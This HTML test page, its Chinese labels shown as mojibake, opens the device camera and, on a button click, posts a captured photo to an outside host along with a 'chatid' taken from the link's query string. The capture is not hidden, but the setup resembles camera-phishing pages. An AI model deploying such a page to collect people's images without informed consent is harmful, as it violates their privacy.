<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<title>æ‹ç…§ä¸Šä¼ æµ‹è¯•</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
  body {
    margin: 0;
    padding: 20px;
    font-family: Arial;
    background: #000;
    color: white;
    text-align: center;
  }
  #video {
    width: 100%;
    max-width: 400px;
    height: 300px;
    background: #333;
    margin: 20px auto;
    display: block;
  }
  button {
    background: #4CAF50;
    color: white;
    border: none;
    padding: 15px 30px;
    font-size: 18px;
    border-radius: 5px;
    cursor: pointer;
    margin: 10px;
  }
  button:disabled {
    background: #666;
    cursor: not-allowed;
  }
  #status {
    margin: 20px;
    padding: 10px;
    background: #333;
    border-radius: 5px;
    min-height: 40px;
  }
</style>
</head>
<body>
<h1>æ‹ç…§ä¸Šä¼ æµ‹è¯•</h1>

<video id="video" autoplay playsinline muted></video>
<br>
<button id="capture">ğŸ“¸ ç‚¹å‡»æ‹ç…§å¹¶ä¸Šä¼ </button>

<div id="status">å‡†å¤‡ä¸­...</div>

<script>
const video = document.getElementById('video');
const captureBtn = document.getElementById('capture');
const statusDiv = document.getElementById('status');

let stream = null;

// åˆå§‹åŒ–æ‘„åƒå¤´
async function initCamera() {
  try {
    statusDiv.textContent = "æ­£åœ¨å¯åŠ¨æ‘„åƒå¤´...";
    
    stream = await navigator.mediaDevices.getUserMedia({ 
      video: { facingMode: "environment" },
      audio: false 
    });
    
    video.srcObject = stream;
    statusDiv.textContent = "âœ… æ‘„åƒå¤´å°±ç»ªï¼ç‚¹å‡»æ‹ç…§ä¸Šä¼ ";
    captureBtn.disabled = false;
    
  } catch (error) {
    // å¦‚æœåç½®å¤±è´¥ï¼Œå°è¯•å‰ç½®
    try {
      stream = await navigator.mediaDevices.getUserMedia({ 
        video: true,
        audio: false 
      });
      
      video.srcObject = stream;
      statusDiv.textContent = "âœ… æ‘„åƒå¤´å°±ç»ªï¼ˆå‰ç½®ï¼‰ï¼ç‚¹å‡»æ‹ç…§ä¸Šä¼ ";
      captureBtn.disabled = false;
    } catch (fallbackError) {
      statusDiv.textContent = "âŒ æ— æ³•è®¿é—®æ‘„åƒå¤´";
      captureBtn.disabled = true;
    }
  }
}

// ä¸Šä¼ ç…§ç‰‡
async function uploadPhoto(blob) {
  const formData = new FormData();
  formData.append('photo', blob, 'test.jpg');
  
  // æ·»åŠ åŸºæœ¬å‚æ•°
  const params = new URLSearchParams();
  params.append('name', 'æµ‹è¯•ç”¨æˆ·');
  params.append('time', Date.now().toString());
  
  // ä»URLè·å–chatid
  const urlParams = new URLSearchParams(window.location.search);
  const chatid = urlParams.get('chatid');
  if (chatid) {
    params.append('chatid', chatid);
  }
  
  const url = `https://huiying888.onrender.com/upload?${params.toString()}`;
  
  try {
    const response = await fetch(url, {
      method: 'POST',
      body: formData
    });
    
    if (!response.ok) {
      throw new Error(`HTTP ${response.status}`);
    }
    
    const result = await response.json();
    return result;
  } catch (error) {
    throw error;
  }
}

// æ‹ç…§å¹¶ä¸Šä¼ 
captureBtn.addEventListener('click', async function() {
  console.log("å¼€å§‹æ‹ç…§ä¸Šä¼ æµç¨‹");
  
  captureBtn.disabled = true;
  statusDiv.textContent = "æ‹ç…§ä¸­...";
  
  try {
    // æ‹ç…§
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    
    statusDiv.textContent = "ä¸Šä¼ ä¸­...";
    
    // è½¬æ¢ä¸ºBlobå¹¶ä¸Šä¼ 
    canvas.toBlob(async (blob) => {
      try {
        const result = await uploadPhoto(blob);
        
        if (result && result.code === 0) {
          statusDiv.textContent = "âœ… ä¸Šä¼ æˆåŠŸï¼";
        } else {
          statusDiv.textContent = "âŒ ä¸Šä¼ å¤±è´¥: " + (result.msg || 'æœªçŸ¥é”™è¯¯');
        }
      } catch (error) {
        statusDiv.textContent = "âŒ ä¸Šä¼ å¤±è´¥: " + error.message;
      } finally {
        captureBtn.disabled = false;
      }
    }, 'image/jpeg', 0.8);
    
  } catch (error) {
    statusDiv.textContent = "âŒ æ‹ç…§å¤±è´¥: " + error.message;
    captureBtn.disabled = false;
  }
});

// é¡µé¢åŠ è½½ååˆå§‹åŒ–
window.addEventListener('load', initCamera);
</script>
</body>
</html>
